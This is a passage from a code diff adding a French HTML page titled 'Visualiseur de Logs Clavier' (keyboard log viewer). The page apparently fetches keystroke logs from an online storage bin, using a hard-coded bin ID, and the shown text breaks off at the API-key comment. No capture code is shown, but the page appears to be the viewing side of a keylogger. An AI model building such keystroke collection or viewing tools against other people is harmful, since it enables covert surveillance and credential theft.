@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visualiseur de Logs</title>
+    <style>
+        body { font-family: 'Courier New', Courier, monospace; background-color: #1e1e1e; color: #d4d4d4; margin: 20px; }
+        h1 { color: #569cd6; }
+        pre { background-color: #252526; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
+        .status { color: #4ec9b0; margin-bottom: 20px; }
+        .error { color: #f44747; }
+    </style>
+</head>
+<body>
+
+    <h1>Visualiseur de Logs Clavier</h1>
+    <p class="status" id="status">Chargement des logs...</p>
+
+    <pre id="log-content"></pre>
+
+    <script>
+        // Remplacez par VOS identifiants
+        const BIN_ID = "6936d04a43b1c97be9dfacb1";
+        // Pour la clé API, il est plus sûr d'utiliser une clé en lecture seule si
